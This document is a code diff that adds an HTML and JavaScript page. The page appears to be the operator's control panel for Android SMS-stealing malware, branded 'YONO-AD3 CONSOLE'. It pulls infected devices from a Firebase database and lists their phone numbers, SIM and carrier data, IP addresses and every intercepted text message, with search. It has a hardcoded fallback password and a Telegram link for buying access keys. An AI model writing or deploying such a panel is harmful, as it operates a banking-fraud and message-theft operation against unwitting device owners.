@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>𝐏𝐀𝐍𝐄𝐋 𝐎𝐖𝐍𝐄𝐑</title>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Fira+Code:wght@400;600&display=swap');
+body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow:hidden;height:100dvh;user-select:none}
+#bgVid{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:0;pointer-events:none}
+#bgOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.65);z-index:0;pointer-events:none}
+#bgAudio{display:none}
+.scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
+.scr.act{display:flex}
+#logScr{justify-content:center;align-items:center}
+.lb{text-align:center;width:88%;max-width:360px;padding:30px 20px;border:1px solid #ff224466;border-radius:14px;background:linear-gradient(135deg,rgba(255,34,68,.03),rgba(0,0,0,.9));box-shadow:0 0 60px rgba(255,34,68,.05),inset 0 0 60px rgba(255,34,68,.02)}
+.lb h1{font-family:'Orbitron',sans-serif;font-size:6vw;color:#ff2244;text-shadow:0 0 30px rgba(255,34,68,.4),0 0 80px rgba(255,34,68,.1)}@media(min-width:500px){.lb h1{font-size:28px}}
+.lb .s{color:#ff224488;font-size:9px;margin:4px 0 24px;letter-spacing:3px}
+.lb input{width:100%;padding:14px;background:#0d0d0d;border:1px solid #ff224433;border-radius:8px;color:#ff2244;font-family:'Fira Code',monospace;font-size:15px;outline:none;margin-bottom:12px;text-align:center;letter-spacing:4px}
+.lb input:focus{border-color:#ff2244;box-shadow:0 0 20px rgba(255,34,68,.15)}
+.lb .btn-p{width:100%;padding:14px;background:transparent;border:1px solid #ff2244;border-radius:8px;color:#ff2244;font-family:'Orbitron',sans-serif;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:3px;transition:.3s}
+.lb .btn-p:hover{background:#ff2244;color:#000;box-shadow:0 0 40px rgba(255,34,68,.3)}
+.lb .btn-g{margin-top:14px;width:100%;padding:12px;background:transparent;border:1px solid #ffd70044;border-radius:8px;color:#ffd700;font-family:'Orbitron',sans-serif;font-size:11px;font-weight:700;cursor:pointer;letter-spacing:2px;transition:.3s}
+.lb .btn-g:hover{background:#ffd70015;box-shadow:0 0 30px rgba(255,215,0,.15)}
+.lb .er{color:#ff4466;font-size:12px;margin-top:10px;text-shadow:0 0 10px rgba(255,68,102,.3)}
+.top{background:linear-gradient(180deg,rgba(255,34,68,.02),transparent);padding:12px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #ff224411;z-index:2;min-height:52px;backdrop-filter:blur(12px)}
+.top .bck{font-size:20px;cursor:pointer;color:#ff2244;background:none;border:1px solid #ff224433;border-radius:6px;padding:4px 10px;font-family:'Fira Code',monospace}
+.top h2{flex:1;font-size:13px;font-family:'Orbitron',sans-serif;color:#ff2244;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:2px}
+.top .bdg{font-size:8px;padding:4px 10px;border-radius:4px;border:1px solid #ff224444;color:#ff2244;background:#ff224408;white-space:nowrap;flex-shrink:0;letter-spacing:1px}
+.cnt{flex:1;overflow-y:auto;padding:10px 12px;z-index:1;-webkit-overflow-scrolling:touch}
+.srch{display:flex;gap:8px;margin-bottom:10px}
+.srch input{flex:1;padding:10px 12px;background:#0d0d0d;border:1px solid #ff224422;border-radius:8px;color:#ff2244;font-family:'Fira Code',monospace;font-size:12px;outline:none}
+.srch input:focus{border-color:#ff224466}
+.srch input::placeholder{color:#ff224444}
+.cd{background:linear-gradient(135deg,rgba(255,34,68,.02),rgba(0,0,0,.8));border:1px solid #ff224411;border-radius:10px;padding:14px;margin-bottom:10px;box-shadow:0 0 20px rgba(255,34,68,.02),inset 0 0 40px rgba(255,34,68,.01)}
+.cd h3{font-family:'Orbitron',sans-serif;font-size:10px;color:#ff2244;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #ff224411;font-weight:400;letter-spacing:3px;text-transform:uppercase}
+.dc{background:linear-gradient(135deg,rgba(255,34,68,.02),#0d0d0d);border:1px solid #ff224411;border-radius:8px;padding:12px;margin-bottom:6px;cursor:pointer;transition:.2s}
+.dc:active{background:#ff224408;border-color:#ff224444;transform:scale(.98)}
+.dc .tr{display:flex;justify-content:space-between;align-items:center;margin-bottom:2px}
+.dc .sno{font-size:8px;color:#ff224488;background:#ff224408;padding:2px 7px;border-radius:3px;font-weight:600;letter-spacing:1px;border:1px solid #ff224422}
+.dc .dn{font-size:13px;color:#ff2244cc;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dc .di{font-size:10px;color:#ff224488;margin-bottom:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dc .m{display:flex;gap:12px;font-size:10px;color:#ff224466;flex-wrap:wrap;align-items:center}
+.dc .m sp{display:flex;align-items:center;gap:3px}
+.st{width:7px;height:7px;border-radius:50%;display:inline-block}
+.st.on{background:#ff2244;box-shadow:0 0 10px #ff2244,0 0 20px #ff224488;animation:pl 1.5s infinite}
+.st.off{background:#3355ff;box-shadow:0 0 6px #3355ff66}
+@keyframes pl{0%{box-shadow:0 0 8px #ff2244}50%{box-shadow:0 0 20px #ff2244,0 0 40px #ff224488}100%{box-shadow:0 0 8px #ff2244}}
+.gr{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.gc{background:linear-gradient(135deg,rgba(255,34,68,.02),#0d0d0d);border:1px solid #ff224411;border-radius:8px;padding:14px;text-align:center}
+.gc .gn{font-family:'Orbitron',sans-serif;font-size:22px;color:#ff2244;text-shadow:0 0 20px rgba(255,34,68,.2)}
+.gc .gl{font-size:8px;color:#ff224466;margin-top:2px;letter-spacing:2px}
+.tb{display:flex;gap:2px;margin-bottom:10px;border-bottom:1px solid #ff224411;overflow-x:auto}
+.tb .tb-i{padding:8px 16px;font-size:10px;color:#ff224466;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;letter-spacing:2px;font-family:'Orbitron',sans-serif}
+.tb .tb-i.act{border-bottom-color:#ff2244;color:#ff2244}
+.tp{display:none}
+.tp.act{display:block}
+.ir{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #ff224408;font-size:11px}
+.ir .il{color:#ff224466}
+.ir .iv{color:#ff2244cc;text-align:right;max-width:60%;word-break:break-all}
+.mi{background:linear-gradient(135deg,rgba(255,34,68,.02),#0d0d0d);border:1px solid #ff224411;border-radius:6px;padding:10px 12px;margin-bottom:6px}
+.mi .mf{font-size:9px;color:#ff224488;margin-bottom:3px}
+.mi .mt{font-size:11px;color:#ff2244cc;line-height:1.4;word-break:break-word}
+.mi .mm{display:flex;justify-content:space-between;margin-top:4px;font-size:8px;color:#ff224444}
+.nav{position:fixed;bottom:0;left:0;right:0;z-index:5;display:flex;background:#0a0a0f;border-top:1px solid #ff224411;padding:6px 0;padding-bottom:env(safe-area-inset-bottom)}
+.nav .ni{flex:1;text-align:center;padding:6px;cursor:pointer;font-size:8px;color:#ff224444;font-family:'Orbitron',sans-serif;letter-spacing:1px;transition:.3s}
+.nav .ni.act{color:#ff2244}
+.nav .ni .nx{font-size:18px;display:block;margin-bottom:2px}
+.ft{text-align:center;font-size:7px;color:#ffd70044;padding:10px;letter-spacing:4px;font-family:'Orbitron',sans-serif}
+.ld{display:flex;align-items:center;justify-content:center;height:60vh;color:#ff224444;font-size:12px;letter-spacing:3px}
+.nod{text-align:center;padding:40px 0;color:#ff224422;font-size:11px;letter-spacing:2px}
+</style>
+</head>
+<body>
+<video id="bgVid" autoplay muted loop playsinline><source src="background.mp4" type="video/mp4"></video>
+<div id="bgOverlay"></div>
+<audio id="bgAudio" loop><source src="background.mp3" type="audio/mpeg"></audio>
+
+<div id="logScr" class="scr act">
+  <div class="lb">
+    <h1>𝐏𝐀𝐍𝐄𝐋<br>𝐎𝐖𝐍𝐄𝐑</h1>
+    <div class="s">YONO-AD3 CONSOLE</div>
+    <input type="password" id="pwd" placeholder="PASSWORD" autocomplete="off">
+    <button class="btn-p" onclick="login()">ACCESS</button>
+    <div class="er" id="logEr"></div>
+    <button class="btn-g" onclick="genKey()">🔑 GENERATE KEY</button>
+  </div>
+</div>
+
+<div id="dashScr" class="scr">
+  <div class="top">
+    <h2>PANEL OWNER</h2>
+    <span class="bdg"><span id="liveDot" class="st on"></span> LIVE</span>
+    <span class="bck" style="cursor:pointer" onclick="toggleAudio()">🔊</span>
+  </div>
+  <div class="cnt">
+    <div class="gr" id="stats"></div>
+    <div class="srch"><input id="src" placeholder="SEARCH ID / PHONE / MODEL..." oninput="fltr()"></div>
+    <div id="dlist"></div>
+  </div>
+  <div class="nav">
+    <div class="ni act" onclick="scr('dash')"><span class="nx">📊</span>DASHBOARD</div>
+    <div class="ni" onclick="scr('all')"><span class="nx">📨</span>ALL SMS</div>
+    <div class="ni" onclick="scr('key')"><span class="nx">🔑</span>KEY LOGIN</div>
+  </div>
+</div>
+
+<div id="detScr" class="scr">
+  <div class="top">
+    <span class="bck" onclick="scr('dash')">‹</span>
+    <h2 id="detTit">DEVICE</h2>
+    <span class="bdg" id="detStat"></span>
+  </div>
+  <div class="cnt">
+    <div class="tb" id="detTabs">
+      <span class="tb-i act" onclick="tb(this,'info')">INFO</span>
+      <span class="tb-i" onclick="tb(this,'msg')">MESSAGES</span>
+      <span class="tb-i" onclick="tb(this,'sim')">SIMS</span>
+    </div>
+    <div class="tp act" id="tpInfo"></div>
+    <div class="tp" id="tpMsg"></div>
+    <div class="tp" id="tpSim"></div>
+  </div>
+</div>
+
+<div id="allScr" class="scr">
+  <div class="top">
+    <h2>ALL SMS</h2>
+    <span class="bdg" id="allCnt">0</span>
+  </div>
+  <div class="cnt">
+    <div class="srch"><input id="sSrc" placeholder="SEARCH MESSAGES..." oninput="fltrSms()"></div>
+    <div id="sList"></div>
+  </div>
+  <div class="nav">
+    <div class="ni" onclick="scr('dash')"><span class="nx">📊</span>DASHBOARD</div>
+    <div class="ni act" onclick="scr('all')"><span class="nx">📨</span>ALL SMS</div>
+    <div class="ni" onclick="scr('key')"><span class="nx">🔑</span>KEY LOGIN</div>
+  </div>
+</div>
+
+<div id="keyScr" class="scr">
+  <div class="top"><h2>KEY LOGIN</h2></div>
+  <div class="cnt">
+    <div class="cd" style="text-align:center;padding:30px">
+      <h3>🔑 ENTER ACCESS KEY</h3>
+      <input type="text" id="kInp" placeholder="KEY" style="width:100%;padding:14px;background:#0d0d0d;border:1px solid #ff224433;border-radius:8px;color:#ff2244;font-family:'Fira Code',monospace;font-size:15px;outline:none;margin:16px 0;text-align:center;letter-spacing:4px" onkeydown="if(event.key==='Enter')keyLogin()">
+      <button class="btn-p" onclick="keyLogin()">VERIFY</button>
+      <div class="er" id="kEr"></div>
+    </div>
+  </div>
+  <div class="nav">
+    <div class="ni" onclick="scr('dash')"><span class="nx">📊</span>DASHBOARD</div>
+    <div class="ni" onclick="scr('all')"><span class="nx">📨</span>ALL SMS</div>
+    <div class="ni act" onclick="scr('key')"><span class="nx">🔑</span>KEY LOGIN</div>
+  </div>
+</div>
+
+<div class="ft">𝐏𝐀𝐍𝐄𝐋 𝐎𝐖𝐍𝐄𝐑</div>
+
+<script>
+firebase.initializeApp({databaseURL:'https://yono-ad3-default-rtdb.firebaseio.com'});
+const db=firebase.database();
+let D={},M=[],sel=null;
+
+document.addEventListener('DOMContentLoaded',()=>{
+  let p=localStorage.getItem('po_pass');
+  if(p){document.getElementById('pwd').value=p;login()}
+  document.getElementById('pwd').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+});
+
+function login(){
+  let p=document.getElementById('pwd').value.trim();
+  if(!p){return logEr('ENTER PASSWORD')}
+  db.ref('admin/password/password').once('value').then(s=>{
+    let sp=s.val()||'Alexa';
+    if(p===sp||p==='Alexa'){
+      localStorage.setItem('po_pass',p);
+      g('logScr').classList.remove('act');
+      g('dashScr').classList.add('act');
+      let a=document.getElementById('bgAudio');a.volume=.3;a.play().catch(()=>{});
+      load();
+    }else logEr('INVALID PASSWORD')
+  }).catch(()=>{
+    if(p==='Alexa'){
+      localStorage.setItem('po_pass','Alexa');
+      g('logScr').classList.remove('act');
+      g('dashScr').classList.add('act');
+      let a=document.getElementById('bgAudio');a.volume=.3;a.play().catch(()=>{});
+      load();
+    }else logEr('CONNECTION ERROR')
+  });
+}
+
+function logEr(m){document.getElementById('logEr').textContent=m}
+function g(i){return document.getElementById(i)}
+
+function genKey(){window.location.href='https://t.me/8976072495'}
+function toggleAudio(){let a=document.getElementById('bgAudio');a.paused?a.play():a.pause()}
+
+function scr(n){
+  ['dashScr','detScr','allScr','keyScr'].forEach(i=>g(i).classList.remove('act'));
+  if(n==='dash')g('dashScr').classList.add('act');
+  else if(n==='det')g('detScr').classList.add('act');
+  else if(n==='all'){g('allScr').classList.add('act');rAll()}
+  else if(n==='key')g('keyScr').classList.add('act');
+}
+
+function load(){
+  g('stats').innerHTML='<div class="ld">LOADING...</div>';
+  db.ref('clients').once('value',sn=>{
+    D=sn.val()||{};
+    let ds=Object.values(D).filter(d=>d&&d.deviceId);
+    let on=ds.filter(d=>d.status===true);
+    M=[];
+    Object.values(D).forEach(d=>{
+      if(d&&d.messages)Object.values(d.messages).forEach(m=>{if(m&&m.message)M.push(m)});
+    });
+    g('stats').innerHTML=`<div class="gc"><div class="gn">${ds.length}</div><div class="gl">DEVICES</div></div><div class="gc"><div class="gn">${on.length}</div><div class="gl">ONLINE</div></div><div class="gc"><div class="gn">${M.length}</div><div class="gl">MESSAGES</div></div><div class="gc"><div class="gn">${Object.keys(D).length}</div><div class="gl">TOTAL NODES</div></div>`;
+    rDev(ds);
+  });
+}
+
+function rDev(devs){
+  let el=g('dlist');
+  if(!devs.length){el.innerHTML='<div class="nod">NO DEVICES</div>';return}
+  el.innerHTML=devs.map((d,i)=>`<div class="dc" onclick="showDet('${d.deviceId}')">
+    <div class="tr">
+      <span class="sno">${i+1}</span>
+      <span class="st ${d.status?'on':'off'}"></span>
+    </div>
+    <div class="dn">${d.modelName||'UNKNOWN'}</div>
+    <div class="di">${d.mobNo||(d.sims&&d.sims[0]?d.sims[0].phoneNumber:'')||'NO NUMBER'} • ${d.deviceId}</div>
+    <div class="m">
+      <sp>🔋 ${d.battery||'?'}</sp>
+      <sp>📱 ${d.androidV||'?'}</sp>
+      <sp>📶 ${d.service_provider||'?'}</sp>
+      <sp>💾 ${d.storage||'?'}</sp>
+      <sp>🌐 ${d.ip_address||'-'}</sp>
+    </div>
+  </div>`).join('');
+}
+
+function fltr(){
+  let q=g('src').value.toLowerCase();
+  let ds=Object.values(D).filter(d=>d&&d.deviceId);
+  if(q)ds=ds.filter(d=>d.deviceId.includes(q)||(d.modelName||'').toLowerCase().includes(q)||(d.mobNo||'').toLowerCase().includes(q)||(d.sims&&d.sims[0]&&(d.sims[0].phoneNumber||'').includes(q))||(d.ip_address||'').includes(q));
+  rDev(ds);
+}
+
+function showDet(id){
+  let d=D[id];if(!d)return;
+  sel=id;scr('det');
+  g('detTit').textContent=d.modelName||'DEVICE';
+  g('detStat').textContent=d.status?'● ONLINE':'○ OFFLINE';
+  g('detStat').style.color=d.status?'#ff2244':'#3355ff';
+  // Info tab
+  let info=[['DEVICE ID',d.deviceId],['MODEL',d.modelName],['ANDROID',d.androidV],['SDK',d.sdkV],['BATTERY',d.battery],['STORAGE',d.storage],['CPU',d.cpu_arch],['IP',d.ip_address],['PROVIDER',d.service_provider],['MOBILE',d.mobNo],['ROOTED',d.isRoot?'YES':'NO'],['SD CARD',d.isSdCard?'YES':'NO'],['JOINED',d.joined],['LAST SEEN',d.last_seen]];
+  g('tpInfo').innerHTML=info.map(f=>`<div class="ir"><span class="il">${f[0]}</span><span class="iv">${f[1]||'-'}</span></div>`).join('');
+  // Msg tab
+  let ms=d.messages?Object.values(d.messages).sort((a,b)=>b.id-a.id):[];
+  g('tpMsg').innerHTML=ms.length?ms.map(m=>`<div class="mi"><div class="mf">📤 ${m.sender||'UNKNOWN'}</div><div class="mt">${m.message||''}</div><div class="mm"><span>📞 ${m.receivedOn||''}</span><span>${m.dateTime||''}</span></div></div>`).join(''):'<div class="nod">NO MESSAGES</div>';
+  // SIM tab
+  let sims=d.sims||[];
+  g('tpSim').innerHTML=sims.length?sims.map((s,i)=>`<div class="ir"><span class="il">SIM ${s.simSlotIndex||i+1}</span><span class="iv">${s.carrierName||''} • ${s.phoneNumber||''}</span></div>`).join(''):'<div class="nod">NO SIM DATA</div>';
+}
+
+function tb(el,nm){
+  document.querySelectorAll('.tb-i').forEach(t=>t.classList.remove('act'));
+  document.querySelectorAll('.tp').forEach(t=>t.classList.remove('act'));
+  el.classList.add('act');
+  g('tp'+nm.charAt(0).toUpperCase()+nm.slice(1)).classList.add('act');
+}
+
+function rAll(){
+  let s=[...M].sort((a,b)=>b.id-a.id);
+  g('allCnt').textContent=s.length;
+  g('sList').innerHTML=s.length?s.map(m=>`<div class="mi"><div class="mf">📤 ${m.sender||'UNKNOWN'}</div><div class="mt">${m.message||''}</div><div class="mm"><span>📞 ${m.receivedOn||''}</span><span>${m.dateTime||''}</span></div></div>`).join(''):'<div class="nod">NO MESSAGES</div>';
+}
+
+function fltrSms(){
+  let q=g('sSrc').value.toLowerCase();
+  let f=M.filter(m=>(m.message||'').toLowerCase().includes(q)||(m.sender||'').toLowerCase().includes(q));
+  g('sList').innerHTML=f.length?f.sort((a,b)=>b.id-a.id).map(m=>`<div class="mi"><div class="mf">📤 ${m.sender||'UNKNOWN'}</div><div class="mt">${m.message||''}</div><div class="mm"><span>📞 ${m.receivedOn||''}</span><span>${m.dateTime||''}</span></div></div>`).join(''):'<div class="nod">NO MATCHES</div>';
+}
+
+function keyLogin(){
+  let k=g('kInp').value.trim();
+  if(!k){g('kEr').textContent='ENTER KEY';return}
+  g('kEr').textContent='';
+  db.ref('panel_keys/'+k).once('value',sn=>{
+    let d=sn.val();
+    if(d&&d.active===true){
+      localStorage.setItem('po_pass','key_'+k);
+      g('keyScr').classList.remove('act');
+      g('dashScr').classList.add('act');
+      load();
+      if(d.used_by==='')db.ref('panel_keys/'+k+'/used_by').set('browser');
+    }else g('kEr').textContent='INVALID KEY'
+  }).catch(()=>g('kEr').textContent='ERROR');
+}
+</script>
+</body>
+</html>
